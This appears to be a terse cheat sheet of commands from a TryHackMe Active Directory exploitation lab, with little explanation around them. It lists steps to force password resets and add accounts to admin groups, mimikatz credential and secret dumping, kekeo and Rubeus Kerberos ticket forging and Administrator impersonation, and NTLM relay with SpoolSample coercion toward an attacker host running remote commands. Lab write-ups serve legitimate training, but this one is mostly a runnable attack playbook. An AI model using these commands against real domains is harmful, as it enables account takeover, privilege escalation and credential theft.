ForceChangePassword
Add-ADGroupMember "IT Support" -Members "Your.AD.Account.Username"
Get-ADGroupMember -Identity "IT Support"

Get-ADGroupMember -Identity "Tier 2 Admins"
PS C:\>$Password = ConvertTo-SecureString "New.Password.For.User" -AsPlainText -Force 
PS C:\>Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password 

Constrained Delegation Exploitation
Import-Module C:\Tools\PowerView.ps1 
Get-NetUser -TrustedToAuth

C:\Tools\mimikatz_trunk\x64\mimikatz.exe
   mimikatz # token::elevate
   mimikatz # lsadump::secrets
Now,
PS C:\> C:\Tools\kekeo\x64\kekeo.exe
        kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted
        kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
        kekeo # exit

Open mimikatz and run
mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

Exploiting authentication relays
python3 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"server IP" -debug
C:\Tools\>SpoolSample.exe dumb.AD1 "Attacker IP"
python3 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug

Finding Vulnerable Certificate
C:\>certutil -Template -v > templates.txt
Impersonation
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile: /domain:za.tryhackme.loc /dc








